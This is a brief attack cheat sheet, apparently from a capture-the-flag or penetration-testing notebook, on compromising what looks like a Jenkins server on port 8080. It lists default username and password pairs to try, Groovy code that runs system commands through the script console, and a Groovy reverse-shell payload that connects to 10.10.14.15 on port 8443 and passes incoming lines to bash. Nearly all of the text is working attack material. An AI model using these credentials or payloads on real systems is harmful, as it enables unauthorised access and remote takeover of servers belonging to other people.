```
Try default credentials

admin:password
admin:admin
root:root
root:password
admin:admin1
admin:password1
root:password1

Navigate to the following page >>
http://{target_IP}:8080/scrip

To run commands
```
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

```
To get a reverse shell
```
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()```
```
```